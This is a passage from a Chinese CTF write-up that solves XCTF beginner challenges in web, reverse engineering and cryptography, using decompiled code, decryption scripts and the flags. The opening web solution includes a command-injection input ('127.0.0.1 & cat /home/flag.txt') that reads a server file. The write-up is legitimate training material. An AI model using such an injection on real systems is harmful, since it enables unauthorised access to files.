然后看下图可以发现找到了,在/home/flag.txt

![11](https://img-blog.csdnimg.cn/20190523202836238.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI2NDA2NDQ3,size_16,color_FFFFFF,t_70)

 然后cat 文件得到flag

```
127.0.0.1 & cat /home/flag.txt
```

cyberpeace{86471d4238d9bc8a7f7f3e63ecbc11da}

#### 12-Web-simple_js 

**题目描述：**

 小宁发现了一个网页,但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} ) 

**题目思路：**

从题目就可以看出是一道javascript题

访问页面,查看源码,可以看到js代码

 分析得到下面的16进制的字符就是flag内容…

 **解题过程：**![7](https://img-blog.csdnimg.cn/20190523202723179.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI2NDA2NDQ3,size_16,color_FFFFFF,t_70)

1.首先url解码得到 55,56,54,79,115,69,114,116,107,49,50 接着进行ASCII转字符：

t=input().split(',') 

for i in t:   

​	print(chr(i), end="") 

2.浏览器控制台执行 document.write(String.fromCharCode(55,56,54,79,115,69,114,116,107,49,50)); 

Cyberpeace{786OsErtk12}

### REVERSE

#### 1-Reverse-insanity

**题目来源：**

9447 CTF 2014

**题目描述：**

菜鸡觉得前面的题目太难了，来个简单的缓一下

**题目附件：**

[428f6e6f75754fca8964d35b16a4b709](https://adworld.xctf.org.cn/media/task/attachments/428f6e6f75754fca8964d35b16a4b709)

**题目思路：**

按shift+F12打开字符串窗口可以发现flag

**解题过程：**

查壳和程序的详细信息

![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/23feddf453307df02f1d1cf9e11b051f.png#pic_center)

发现这是ELF文件，该程序在Linux环境下运行，用32位IDA静态分析：进入main函数，F5进行反汇编

```c
int __cdecl main(int argc, const char **argv, const char **envp){
  unsigned int v3; // eax
  unsigned int v4; // eaxc
  puts("Reticulating splines, please wait..");
  sleep(5u);
  v3 = time(0);
  srand(v3);
  v4 = rand();
  puts((&strs)[v4 % 0xA]);//<==这里是重点
  return 0;
}
```

发现一个关键的字符串，发现是取这个字符串输出，双击&strs查看

```shell
.data:080499C0 strs            dd offset a9447ThisIsAFla
.data:080499C0                                         ; DATA XREF: main+4D↑r
.data:080499C0                                         ; "9447{This_is_a_flag}"
```
9447{This_is_a_flag}

#### 2-Reverse-simple-unpack

**题目描述：**

菜鸡拿到了一个被加壳的二进制文件

**题目附件：**

[847be14b3e724782b658f2dda2e8045b](https://adworld.xctf.org.cn/media/task/attachments/847be14b3e724782b658f2dda2e8045b)

**题目思路：**

脱壳后使用ida分析

**解题过程：**

使用EXEInfoPE查壳和程序的详细信息（52pojie虚拟机中有此软件）

![img](https://img-blog.csdnimg.cn/img_convert/ca361e716f4707882e0507d42623db22.png)

发现有upx壳(windows下的文件是PE文件，Linux/Unix下的文件是ELF文件)，然后通过upx -d 文件名，对upx壳进行脱壳，发现去壳的文件变大了

![img](https://img-blog.csdnimg.cn/img_convert/e03bc5d4bbf1c6b907f772721261cec4.png)

生成的文件载入IDA64中，还是从main函数开始分析，F5反编译得到伪C代码，然后双击flag，或者从shift+f12显示出的字符串中ctrl+f搜索flag。

![img](https://img-blog.csdnimg.cn/img_convert/0f7f99e958a0b6c6f4b82e4eeb092342.png)

flag{Upx_1s_n0t_a_d3liv3r_c0mp4ny}

#### 3-Reverse-logmein

**题目来源：**

RC3 CTF 2016

**题目描述：**

菜鸡开始接触一些基本的算法逆向了

**题目附件：**

[a7554d316da840d3a381e4e8348201e9](https://adworld.xctf.org.cn/media/task/attachments/a7554d316da840d3a381e4e8348201e9)

**题目思路：**

逆向程序，找到关键位置，对算法进行逆向即可得到flag

**解题过程：**

拿到程序后，我们首先查壳和程序的详细信息

![img](https://img-blog.csdnimg.cn/img_convert/4fc3442582f68b52aa16ede97e7079ee.png)

发现是64位的ELF文件，载入IDA64，找到main函数，F5反编译得到伪C代码。

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3){
  size_t v3; // rsi
  int i; // [rsp+3Ch] [rbp-54h]
  char s[36]; // [rsp+40h] [rbp-50h]
  int v6; // [rsp+64h] [rbp-2Ch]
  __int64 v7; // [rsp+68h] [rbp-28h]
  char v8[8]; // [rsp+70h] [rbp-20h]
  int v9; // [rsp+8Ch] [rbp-4h]
  v9 = 0;
  strcpy(v8, ":\"AL_RT^L*.?+6/46");
  v7 = 'ebmarah';
  v6 = 7;
  printf("Welcome to the RC3 secure password guesser.\n", a2, a3);
  printf("To continue, you must enter the correct password.\n");
  printf("Enter your guess: ");
  __isoc99_scanf((__int64)"%32s", (__int64)s);
  v3 = strlen(s);
  if ( v3 < strlen(v8) )
    sub_4007C0();
  for ( i = 0; i < strlen(s); ++i ){
    if ( i >= strlen(v8) )
      sub_4007C0();
    if ( s[i] != (char)(*((_BYTE *)&v7 + i % v6) ^ v8[i]) )
      sub_4007C0();
  }
  sub_4007F0();
}
```

梳理运算逻辑，先是将指定字符串复制到v8，s是用户输入的字符串，长度给v3，然后v3和v8的长度进行比较，如果长度比v8小，则进入sub_4007c0函数，输出字符串Incorrect password，退出

![img](https://img-blog.csdnimg.cn/img_convert/617ba3a60da98c2c0aae9cabdfbae418.png)

如果长度大于或等与v8则进入下面的循环，判断如果输入的字符串和经过运算后的后字符串不等，则进入sub_4007c0，输出Incorrect password，如果想得到flag，就需要走到sub_4007f0函数

![img](https://img-blog.csdnimg.cn/img_convert/589fb3ebad8d560757a9bc5442b72755.png)

接下来根据加密方式写解密脚本

```python
key1=":\"AL_RT^L*.?+6/46"#v8
key2="harambe"
key3=7#v6
flag=""
for i in range(0,len(key1)):
    flag+=chr(ord(key1[i])^ord(key2[i%key3]))#取出key1中的每个字符转换成ascii码与key2的第i取余7个位置的字符的ascii码进行异或
print(flag)
```

由于程序是小段的存储方式，所以ebmarah变成harambe，ord():是将字符串转换为ascii，chr():是将ascii转换为字符串，运行脚本得到flag

RC3-2016-XORISGUD

#### 4-Reverse-open-source

**题目来源：**

HackYou CTF

**题目描述：**

菜鸡学逆向学得头皮发麻，终于它拿到了一段源代码

**题目附件：**

[8b6405c25fe447fa804c6833a0d72808.c](https://adworld.xctf.org.cn/media/task/attachments/8b6405c25fe447fa804c6833a0d72808.c)

**题目思路：**

对源码分析

**解题过程：**

查看源码，结合注释

```c
#include <stdio.h>
#include <string.h>
int main(int argc, char *argv[]) {
    if (argc != 4) {
    	printf("what?\n");
    	exit(1);
    }
    unsigned int first = atoi(argv[1]);
    if (first != 0xcafe) {//得出first=0xcafe转换成10进值为51966
    	printf("you are wrong, sorry.\n");
    	exit(2);
    }
    unsigned int second = atoi(argv[2]);
    if (second % 5 == 3 || second % 17 != 8) {//second=25
    	printf("ha, you won't get it!\n");
    	exit(3);
    }
    if (strcmp("h4cky0u", argv[3])) {//argv[3]=’h4cky0u’
    	printf("so close, dude!\n");
    	exit(4);
    }
    printf("Brr wrrr grr\n");
    unsigned int hash = first * 31337 + (second % 17) * 11 + strlen(argv[3]) - 1615810207;
    printf("Get your key: ");
    printf("%x\n", hash);
    return 0;
}
```

可以看到需要添三个参数，第一个是0xcafe，第二个是满足or的一个数字，第三个是h4cky0u，最后会输出key

```c
#include <stdio.h>
#include <string.h>
int main () {
	unsigned int first = 51966;
	unsigned int second=25;
	unsigned int hash = first * 31337 + (second % 17) * 11 + strlen("h4cky0u") - 1615810207;
	printf("Get your key: ");
	printf("%x\n", hash);
	return 0;
}
```

[在网站运行一下](https://tool.lu/coderunner) 上面的c脚本，或者下面的python脚本

```python
first=int('cafe',16)
argv3='h4cky0u'
for second in range(100):
	if((second%5!=3)and(second%17==8)):
		break
hash=int(first *31337+(second%17)*11+len(argv3)-1615810207)
print(hex(hash))
```

c0ffee

#### 5-Reverse-python-trade

**题目描述：**

菜鸡和菜猫进行了一场Py交易

**题目附件：**

[f417c0d03b0344eb9969ed0e1f772091.pyc](https://adworld.xctf.org.cn/media/task/attachments/f417c0d03b0344eb9969ed0e1f772091.pyc)

**题目思路：**

在线python反编译，根据文件的运算逻辑进行逆向

**解题过程：**

python是先编译再解释型语言。pyc后缀的文件是python编译产生的中间文件。python解释器由一个编译器和一个虚拟机构成，python.exe先将源码编译成字节码(即将.py 文件换转成.pyc 文件)，.pyc不是二进制码，而是py文件编译后生成的字节码文件，它是与平台无关的中间代码，不管是在Windows 还是Linux 平台都可以执行。运行时再由虚拟机逐行把字节码翻译成目标代码。

利用[在线反编译的网站](https://tool.lu/pyc)将pyc文件反编译出py文件，flag的每一个字符通过异或、加16、base64加密后得到密文

```python
import base64
def encode(message):
    s = ''
    for i in message:
        x = ord(i) ^ 32
        x = x + 16
        s += chr(x)
    return base64.b64encode(s)
correct = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'
flag = ''
print('Input flag:')
flag = input()
if encode(flag) == correct:
    print('correct')
else:
    print('wrong')
```

对运算逻辑进行逆向，先对字符串进行b64decode，然后每一位减16再xor运算

```python
import base64
flag=''
for i in base64.b64decode('XlNkVmtUI1MgXWBZXCFeKY+AaXNt'):
      flag+=chr((i-16)^32)
print(flag)
```

nctf{d3c0mpil1n9_PyC}

#### 7-Reverse-game

**题目描述：**

菜鸡最近迷上了玩游戏,但它总是赢不了,你可以帮他获胜吗

**解题过程：**

打开发现是一个游戏,直接输入12345678就能直接拿到flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190511161554866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjA5MjY0,size_16,color_FFFFFF,t_70)

用IDA静态分析：在函数中搜索main,进入main函数,按F5进行反汇编

```c
int __cdecl main(int argc, const char **argv, const char **envp)
 {
	int result; // eax
	
main_0();
return result;
}
```

跳转到main_0函数,分析代码,当所有灯点亮时,进入sub_13F7AB4(),跳转到该函数

```c
int sub_13F7AB4(void)
	{
	  return sub_13FE940();
	}
```

这是关键的输出flag的函数。

 分析代码,发现是创建了两个长度为57的字符串,并进行运算。

 sub_13F7AB4()翻译成python脚本就是

```python
a=[18,64,98,5,2,4,6,3,6,48,49,65,32,12,48,65,31,78,62,32,49,32,
	   1,57,96,3,21,9,4,62,3,5,4,1,2,3,44,65,78,32,16,97,54,16,44,
	   52,32,64,89,45,32,65,15,34,18,16,0]
b=[123,32,18,98,119,108,65,41,124,80,125,38,124,111,74,49,
	   83,108,94,108,84,6,96,83,44,121,104,110,32,95,117,101,99,
	   123,127,119,96,48,107,71,92,29,81,107,90,85,64,12,43,76,86,
	   13,114,1,117,126,0]
i=0
c=''
while (i<56):
    a[i]^=b[i]
    a[i]^=19
    c=c+chr(a[i])
    i=i+1
print (c)
```

zsctf{T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t}

#### 8-Reverse-Hello, CTF

**题目描述：**

菜鸡发现Flag似乎并不一定是明文比较的

**题目思路：**

ida打开 shift+f12 找到一串16进制字符，结合代码直接十六进制解码得到flag，文本编辑器打开可以看见一个16进制串

**解题过程：**

运行程序，输入正确的flag,才会显示正确

<img src="https://adworld.xctf.org.cn/media/task/writeup/cn/Hello,%20CTF/1.png" alt="img" style="zoom: 80%;" />

查壳(D:\CTF\Reverse\ExeinfoPe\exeinfope.exe)是32位的程序，并且是Microsoft Visual C++编译，而且没有加壳

![img](https://adworld.xctf.org.cn/media/task/writeup/cn/Hello,%20CTF/2.png)

使用od调试(D:\CTF\Reverse\吾爱破解专用版Ollydbg\吾爱破解[LCG].exe)

![img](https://adworld.xctf.org.cn/media/uploads/writeup/439629f06b7d11ea88a7fa163e3c3fd2.png)

也可以用IDA (D:\CTF\Reverse\IDA_Pro_v7.0_Portable\\ida.exe) 依旧先从main开始分析，然后对main函数进行F5查看伪代码

![img](https://adworld.xctf.org.cn/media/task/writeup/cn/Hello,%20CTF/3.png)

首先，可以看到先是将字符串复制到v13的位置，

然后，后面对输入进行了判断，输入的字符串不能大于17

接着，将字符串以十六进制输出(line.31    sprintf(&v8, asc_408044, v4); v4是输入的每一个字符，asc_408044是"%x"，将字符串转换为16进制存入v8)，然后，再将得到的十六进制字符添加到v10

最后，进行比较，看输入的字符串是否和v10的字符串相等，如果相等，则得到真确的flag

![img](https://adworld.xctf.org.cn/media/task/writeup/cn/Hello,%20CTF/4.png)

将十六进制转换为字符串(D:\CTF\Crypto\编码与密码\万能字符转换Character1.2.exe)得到了最后的flag

```python
import binascii 
binascii.a2b_hex("437261636b4d654a757374466f7246756e")
```

CrackMeJustForFun

#### 9-Reverse-re1

**题目描述：**

菜鸡开始学习逆向工程,首先是最简单的题目

**解题过程：**

使用IDA打开,进入main函数,转为C代码

![明文比较](https://img-blog.csdnimg.cn/20191224135401867.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDQ0Njk1,size_16,color_FFFFFF,t_70)

可以看到,输入v9之后,与v5比较,判断我们输入的flag是否正确。分别进入if...else判断之后的输出

v5应该就是flag值,从汇编中看一下v5的值从哪里来

![img](https://img2018.cnblogs.com/blog/1228809/201908/1228809-20190816175750099-2081804484.png)

v9是从ebp+var_24来的,v5的值是从ebp+var_44来的,然后指向了xmm0,最后是从xmmword_413E34和后面的qword_413E44来的

进入ds:xmmword_413E34

![img](https://img2018.cnblogs.com/blog/1228809/201908/1228809-20190816175915527-148146356.png)

将16进制转换为字符,选中字符按R

![img](https://img2018.cnblogs.com/blog/1228809/201908/1228809-20190816180036597-1259453797.png)

因为汇编里面存储字符是采用小端格式,所以结果倒过来输就行,可以使用下面的脚本

```python
str1='0tem0c1eW{FTCTUD'[::-1]
str2='}FTCTUD'[::-1]
print(str1+str2)
```

DUTCTF{We1c0met0DUTCTF}

#### 10-Reverse-no-strings-attached

**题目来源：**

9447 CTF 2014

**题目描述：**

菜鸡听说有的程序运行就能拿Flag？

**题目附件：**

[554e0986d6db4c19b56cfdb22f13c834](https://adworld.xctf.org.cn/media/task/attachments/554e0986d6db4c19b56cfdb22f13c834)

**题目思路：**

直接动态调试，当运行完加密函数后，flag存储在返回的值中

**解题过程：**

拿到程序后，我们首先查壳和查看程序的详细信息，程序是ELF文件，32位

![img](https://adworld.xctf.org.cn/media/task/writeup/cn/no-strings-attached/1.png)

在ubuntu虚拟机中运行一下，输出了两行文字，然后segmenterror，有用信息不多，直接上IDA

```bash
giantbranch@ubuntu:~/Desktop$ ./554e0986d6db4c19b56cfdb22f13c834 
Welcome to cyber malware control software.
Currently tracking 319452330 bots worldwide
554e0986d6db4c19b56cfdb22f13c834: malloc.c:2401: sysmalloc: Assertion `(old_top == initial_top (av) && old_size == 0) || ((unsigned long) (old_size) >= MINSIZE && prev_inuse (old_top) && ((unsigned long) old_end & (pagesize - 1)) == 0)' failed.
Please enter authentication details: Aborted (core dumped)
```

放到IDA里面查看，找到main函数F5反编译

```c
int __cdecl main(int argc, const char **argv, const char **envp){
  setlocale(6, &locale);
  banner();
  prompt_authentication();
  authenticate();
  return 0;
}
```

banner函数中Wprintf输出了两次，双击unk_80488B0和unk_8048960，看到正是命令行下的两行字。返回到上一层，在prompt_authentication函数中，也是一次输出，返回到上一层，继续跟进，进入authenticate函数，发现加密函数decrypt()

```c
void authenticate(){
  wchar_t ws[8192]; // [esp+1Ch] [ebp-800Ch]
  wchar_t *s2; // [esp+801Ch] [ebp-Ch]
  s2 = (wchar_t *)decrypt(&s, &dword_8048A90);//在这里F2下断点
  if ( fgetws(ws, 0x2000, stdin) ){
    ws[wcslen(ws) - 1] = 0;
    if ( !wcscmp(ws, s2) )
      wprintf(&unk_8048B44);
    else
      wprintf(&unk_8048BA4);
  }
  free(s2);
}
```

首先调用了decrypt函数加密得到s2然后和从命令行中输入的ws做对比，对比的结果是，输入正确，输出8048B44处的值,查找可知这个值是个字符串，即“Success!Welcomeback!”,若错误，输出8048BA4处的值，查找可知这个值是：Accessdenied!到此，程序的逻辑清楚了，即接收命令行中的值与加密后的值比较，若输入正确则认证成功，否则失败。双击进入加密函数

```c
wchar_t *__cdecl decrypt(wchar_t *s, wchar_t *a2){
  size_t v2; // eax
  signed int v4; // [esp+1Ch] [ebp-1Ch]
  signed int i; // [esp+20h] [ebp-18h]
  signed int v6; // [esp+24h] [ebp-14h]
  signed int v7; // [esp+28h] [ebp-10h]
  wchar_t *dest; // [esp+2Ch] [ebp-Ch]
  v6 = wcslen(s);
  v7 = wcslen(a2);
  v2 = wcslen(s);
  dest = (wchar_t *)malloc(v2 + 1);
  wcscpy(dest, s);
  while ( v4 < v6 ){
    for ( i = 0; i < v7 && v4 < v6; ++i )
      dest[v4++] -= a2[i];
  }
  return dest;
}
```

分析逻辑，它先把参数s复制给dest，然后把dest的每个值减去a2的值然后返回加密后的dest，再在上级调用函数里与输入的字符串进行比较，相同则提示Success!Welcomeback!不相同则提示Access denied!

将IDA_Pro_v7.0_Portable\dbgsrv目录下的linux_server复制到ubuntu桌面上启动

```bash
giantbranch@ubuntu:~/Desktop$ ./linux_server
IDA Linux 32-bit remote debug server(ST) v1.22. Hex-Rays (c) 2004-2017
Listening on 0.0.0.0:23946...
```

回到ida中F9选择远程Linux调试，输入IP地址后启动动态调试，F7是单步步入，F8单步步过，F5反编译，F9运行，接下来运行到加密函数完成的return位置，鼠标放在dest上可以发现flag，记录下地址，在下面的hex view中按g，跳到地址[heap]:08D10D70就可以看到flag，将flag的位置选中shift+e，选中c unsigned char array(decimal)，就得到c语言的字符串定义代码，复制出来处理一下，将`空格0,`替换为空，然后将空格替换为空，将换行删除调整到一行，将数组复制出来写个python脚本

```python
s=[57,52,52,55,123,121,111,117,95,97,114,101,95,97,110,95,105,110,116,101,114,110,97,116,105,111,110,97,108,95,109,121,115,116,101,114,121,125]
x=""
for i in s:
      x+=chr(i)
print(x)
```

9447{you_are_an_international_mystery}

### CRYPTO

#### 1-Crypto-base64 

**题目来源：**

poxlove3

**题目描述：**

元宵节灯谜是一种古老的传统民间观灯猜谜的习俗。 因为谜语能启迪智慧又饶有兴趣，灯谜增添节日气氛，是一项很有趣的活动。 你也很喜欢这个游戏，这不，今年元宵节，心里有个黑客梦的你，约上你青梅竹马的好伙伴小鱼， 来到了cyberpeace的攻防世界猜谜大会，也想着一展身手。 你们一起来到了小孩子叽叽喳喳吵吵闹闹的地方，你俩抬头一看，上面的大红灯笼上写着一些奇奇怪怪的 字符串，小鱼正纳闷呢，你神秘一笑，我知道这是什么了。

**题目附件：**

[af681321af224387a21c72456530989e.txt](https://adworld.xctf.org.cn/media/task/attachments/af681321af224387a21c72456530989e.txt)

**题目思路：**

base64解密

**解题过程：**

附件下载时文本文档内容是：Y3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9，复制到网站进行[base64解密](https://base64.us/)
cyberpeace{Welcome_to_new_World!}

#### 2-Crypto-Caesar 

**题目来源：**

poxlove3

**题目描述：**

你成功的解出了来了灯谜，小鱼一脸的意想不到“没想到你懂得这么多啊！” 你心里面有点小得意，“那可不是，论学习我没你成绩好轮别的我知道的可不比你少，走我们去看看下一个” 你们继续走，看到前面也是热热闹闹的，同样的大红灯笼高高挂起，旁边呢好多人叽叽喳喳说个不停。你一看 大灯笼，上面还是一对字符，你正冥思苦想呢，小鱼神秘一笑，对你说道，我知道这个的答案是什么了

**题目附件：**

[9f08657b76274fa3b64a8e506ba98c48.txt](https://adworld.xctf.org.cn/media/task/attachments/9f08657b76274fa3b64a8e506ba98c48.txt)

**题目思路：**

凯撒是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推。

**解题过程：**

附件下载时文本文档内容是：oknqdbqmoq{kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz}

复制到[在线解密凯撒密码](https://www.qqxiuzi.cn/bianma/kaisamima.php)，位移12位

 cyberpeace{you_have_learned_caesar_encryption} 

#### 3-Crypto-Morse 

**题目来源：**

poxlove3

**题目描述：**

小鱼得意的瞟了你一眼，神神气气的拿走了答对谜语的奖励，你心里暗暗较劲 想着下一个谜题一定要比小鱼更快的解出来。不知不觉你们走到了下一个谜题的地方，这个地方有些奇怪。 上面没什么提示信息，只是刻着一些0和1，感觉有着一些奇怪的规律，你觉得有些熟悉，但是就是想不起来 这些01代表着什么意思。一旁的小鱼看你眉头紧锁的样子，扑哧一笑，对你讲“不好意思我又猜到答案了。”(flag格式为cyberpeace{xxxxxxxxxx},均为小写)

**题目附件：**

[d622fe4aa5c645e8912acdfec1515803.txt](https://adworld.xctf.org.cn/media/task/attachments/d622fe4aa5c645e8912acdfec1515803.txt)

**题目思路：**
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191026201153819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoaWRvbmdoYW5n,size_16,color_FFFFFF,t_70)

**解题过程**

附件下载时文本文档内容是： 11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110 
把0替换为.，把1替换为-，[摩斯电码解码](http://www.atoolbox.net/Tool.php?Id=776)，[转换成小写](https://www.iamwawa.cn/daxiaoxie.html)
cyberpeace{morsecodeissointeresting}

#### 4-Crypto-混合编码

**题目来源：**

poxlove3

**题目描述：**

经过了前面那么多题目的历练，耐心细致在解题当中是 必不可少的品质，刚巧你们都有，你和小鱼越来越入迷。那么走向了下一个题目，这个题目好长 好长，你知道你们只要细心细致，答案总会被你们做出来的，你们开始慢慢的尝试，慢慢的猜想 ，功夫不负有心人，在你们耐心的一步步的解答下，答案跃然纸上，你俩默契一笑，相视击掌 走向了下面的挑战。格式为cyberpeace{小写的你解出的答案}

**题目附件：**

[78697fd20e9c4ad295a62e5aa30ae052.txt](https://adworld.xctf.org.cn/media/task/attachments/78697fd20e9c4ad295a62e5aa30ae052.txt)

**题目思路：**

base64decode->ascll->base64decode->ascll

**解题过程：**

看到末尾是=，先用[base64](http://tool.oschina.net/encrypt?type=3)解一下：

```
&#76;&#122;&#69;&#120;&#79;&#83;&#56;&#120;&#77;&#68;&#69;&#118;&#77;&#84;&#65;&#52;&#76;&#122;&#107;&#53;&#76;&#122;&#69;&#120;&#77;&#83;&#56;&#120;&#77;&#68;&#107;&#118;&#77;&#84;&#65;&#120;&#76;&#122;&#69;&#120;&#78;&#105;&#56;&#120;&#77;&#84;&#69;&#118;&#79;&#84;&#99;&#118;&#77;&#84;&#69;&#50;&#76;&#122;&#69;&#120;&#78;&#105;&#56;&#53;&#78;&#121;&#56;&#53;&#79;&#83;&#56;&#120;&#77;&#68;&#99;&#118;&#79;&#84;&#99;&#118;&#77;&#84;&#69;&#119;&#76;&#122;&#69;&#119;&#77;&#67;&#56;&#120;&#77;&#68;&#65;&#118;&#77;&#84;&#65;&#120;&#76;&#122;&#69;&#119;&#77;&#105;&#56;&#120;&#77;&#68;&#69;&#118;&#77;&#84;&#69;&#119;&#76;&#122;&#107;&#53;&#76;&#122;&#69;&#119;&#77;&#83;&#56;&#120;&#77;&#84;&#107;&#118;&#77;&#84;&#69;&#120;&#76;&#122;&#69;&#120;&#78;&#67;&#56;&#120;&#77;&#68;&#103;&#118;&#77;&#84;&#65;&#119;
```

放到txt中用`空格`替换所有`&#`然后删除所有`;`，打开[ascii解码网站](http://www.ab126.com/goju/1711.html)放到10进值格中解出来去掉所有的`空格`
```
LzExOS8xMDEvMTA4Lzk5LzExMS8xMDkvMTAxLzExNi8xMTEvOTcvMTE2LzExNi85Ny85OS8xMDcvOTcvMTEwLzEwMC8xMDAvMTAxLzEwMi8xMDEvMTEwLzk5LzEwMS8xMTkvMTExLzExNC8xMDgvMTAw
```
[base64](http://tool.oschina.net/encrypt?type=3)解出来，将所有的`/`替换成`空格`
```
 119 101 108 99 111 109 101 116 111 97 116 116 97 99 107 97 110 100 100 101 102 101 110 99 101 119 111 114 108 100
```
打开[ascii解码网站](http://www.ab126.com/goju/1711.html)放到10进值格中解出来去掉所有的`空格`，最后加上cyberpeace{小写的你解出的答案}

cyberpeace{welcometoattackanddefenceworld} 

#### 5-Crypto-不仅仅是Morse

**题目来源：**

poxlove3

**题目描述：**

“这个题目和我们刚刚做的那个好像啊但是为什么按照刚刚的方法做出来答案却不对呢” ，你奇怪的问了问小鱼，“可能是因为还有一些奇怪的加密方式在里面吧，我们在仔细观察观察”。两个人 安安静静的坐下来开始思考，很耐心的把自己可以想到的加密方式一种种的过了一遍，十多分钟后两个人 异口同声的说“我想到了！”。一种食物,格式为cyberpeace{小写的你解出的答案}

**题目附件：**

[44aaac34ab1449fe8df001fcb0ec4e24.txt](https://adworld.xctf.org.cn/media/task/attachments/44aaac34ab1449fe8df001fcb0ec4e24.txt)

**题目思路：**

附件下载时文本文档，莫斯解码，最后观察到是培根加密，进行解码即可得到flag

**解题过程：**

先把所有的斜杠用空格代替，然后[摩斯电码解码](http://www.atoolbox.net/Tool.php?Id=776)
>MAY_BE_HAVE_ANOTHER_DECODEHHHHAAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA

把所有的AB复制出来，[培根密码解密](https://tool.bugku.com/peigen/)

>attackanddefenceworldisinteresting

cyberpeace{attackanddefenceworldisinteresting} 

#### 6-Crypto-幂数加密  

**题目来源：**

CFF2016

**题目描述：**

你和小鱼终于走到了最后的一个谜题所在的地方，上面写着一段话“亲爱的朋友， 很开心你对网络安全有这么大的兴趣，希望你一直坚持下去，不要放弃 ，学到一些知识， 走进广阔的安全大世界”，你和小鱼接过谜题，开始了耐心细致的解答。flag为cyberpeace{你解答出的八位大写字母}

**题目附件：**

[4b98e01157804f508eb7fc1fd1708051.txt](https://adworld.xctf.org.cn/media/task/attachments/4b98e01157804f508eb7fc1fd1708051.txt)


**题目思路：**

01248密码，又称云影密码，与二进制幂加密不同，这个加密法采用的是0作间隔，其他非0数隔开后组合起来相加表示a-z字母。

**解题过程：**

 0作分割，其他数隔开后组合加和，转化为1-26对应的字母 
| 884210 | 1220 | 480  | 22440 | 40   | 1422420 | 2480 | 1220 |
| ------ | ---- | ---- | ----- | ---- | ------- | ---- | ---- |
| 23     | 5    | 12   | 12    | 4    | 15      | 14   | 5    |
| w      | e    | l    | l     | d    | o       | n    | e    |
cyberpeace{WELLDONE} 

#### 7-Crypto-Railfence

**题目来源：**

poxlove3

**题目描述：**

被小鱼一连将了两军,你心里更加不服气了。两个人一起继续往前走, 一路上杂耍卖艺的很多,但是你俩毫无兴趣,直直的就冲着下一个谜题的地方去了。  到了一看,这个谜面看起来就已经有点像答案了样子了,旁边还画着一张画,是一副农家小院的  图画,上面画着一个农妇在栅栏里面喂5只小鸡,你嘿嘿一笑对着小鱼说这次可是我先找到答案了。

**题目附件：**

[c5eb188a4e514ddc9ceaed3ed1296ce3.txt](https://adworld.xctf.org.cn/media/task/attachments/c5eb188a4e514ddc9ceaed3ed1296ce3.txt)

**题目思路：**

附件下载时文本文档内容是：ccehgyaefnpeoobe{lcirg}epriec_ora_g

 这个不是普通的栅栏密码！ 终于在某个博客上看到了线索： [栅栏密码的变种WWW型](https://blog.csdn.net/qinying001/article/details/96134356)

**解题过程：**

http://www.atoolbox.net/Tool.php?Id=777 （默认 WWW 型加解密,栏数=5）

cyberpeace{railfence_cipher_gogogo}

#### 8-Crypto-easy_RSA

**题目来源：**

poxlove3

**题目描述：**

解答出来了上一个题目的你现在可是春风得意,你们走向了下一个题目所处的地方 你一看这个题目傻眼了,这明明是一个数学题啊！！！可是你的数学并不好。扭头看向小鱼,小鱼哈哈一笑  ,让你在学校里面不好好听讲现在傻眼了吧~来我来！三下五除二,小鱼便把这个题目轻轻松松的搞定了。flag格式为cyberpeace{小写的你解出的答案}

**题目附件：**

[bca4e67e266a4040bbf560751c2f646a.txt](https://adworld.xctf.org.cn/media/task/attachments/bca4e67e266a4040bbf560751c2f646a.txt)

**题目思路：**

附件下载时文本文档内容是：在一次RSA密钥对生成中,假设p=473398607161,q=4511491,e=17
求解出d

好像就是考RSA的公式,那先脑补一下算法

任选两个大质数p和q,p!=q,计算N=pq
计算N的欧拉函数r(n)=(p-1)(q-1)
任选一个e满足 1<e<r(n) ,且e与r(n)互质
找到d,使e*d/r(n)=x……1（x是多少不重要,重要的是余数为1）
至此（n,e）为公钥,（n,d）为私钥
加密：C=M^（e mod n)；解密：M=C^（d mod n）
e d mod Φ（n）=== 1  -->  d=(k(q-1)(p-1)+1)/e

**解题过程：**

d=((q-1)(p-1)+1)/e=((473398607161-1)*(4511491-1)+1)/17

```python
import numpy as np
np.set_printoptions(suppress=True)#取消科学计数法
p=473398607161
q=4511491
n=(q-1)*(p-1)
e=17
k=1
while 1:
   if ((n*k)+1)%e==0:
      d=(n*k+1)/e
      print(d)
      break
   k+=1
```

cyberpeace{125631357777427553}

#### 9-Crypto-easychallenge

**题目来源：**

NJUPT_CTF

**题目描述：**

你们走到了一个冷冷清清的谜题前面，小鱼看着题目给的信息束手无策，丈二和尚摸不着头脑 ，你嘿嘿一笑，拿出来了你随身带着的笔记本电脑，噼里啪啦的敲起来了键盘，清晰的函数逻辑和流程出现在  了电脑屏幕上，你敲敲键盘，更改了几处地方，运行以后答案变出现在了电脑屏幕上。

**题目附件：**

